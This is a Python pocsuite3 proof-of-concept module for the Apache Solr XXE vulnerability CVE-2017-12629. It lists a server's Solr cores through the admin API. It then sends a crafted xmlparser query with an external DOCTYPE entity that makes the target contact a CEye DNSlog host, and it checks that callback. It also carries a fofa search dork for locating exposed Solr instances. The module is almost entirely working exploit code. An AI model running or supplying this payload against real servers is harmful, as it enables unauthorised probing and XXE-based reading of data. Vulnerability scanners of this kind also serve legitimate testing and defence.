"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import base64, json
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, CEye
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text, random_str

class DemoPOC(POCBase):
    vulID = '15'  
    author = ['PeiQi']
    name = 'Apache Solr XXE 漏洞 CVE-2017-12629'
    vulType = VUL_TYPE.XML_INJECTION
    desc = '''Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。
    '''
    appPowerLink = 'Fhem'
    appName = 'Apache Solr'
    appVersion = '< 7.1'
    fofa_dork = {'fofa': 'app="APACHE-Solr"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        random_uri = random_str(8)
        ceye_dnslog = CEye()
        dnslog_url = ceye_dnslog.build_request(value=random_uri, type="dns")["url"]
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/select?q={!xmlparser%20v=%27%3C!DOCTYPE%20a%20SYSTEM%20%22http://" + dnslog_url +  "%22%3E%3Ca%3E%3C/a%3E%27}&wt=xml"
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                _ = requests.get(url_2, headers=headers_2, timeout=5)
                resp_dnslog = ceye_dnslog.verify_request(flag=str.lower(random_uri), type="dns")
                if resp_dnslog:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url_2
                    result['VerifyInfo']['Core'] = core_name
                    result['VerifyInfo']['DnsUrl'] = dnslog_url
                    result['VerifyInfo']['DnsVerify'] = "http://api.ceye.io/v1/records?token=" + ceye_dnslog.token + "&type=dns&filter=" + str.lower(random_uri) 
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)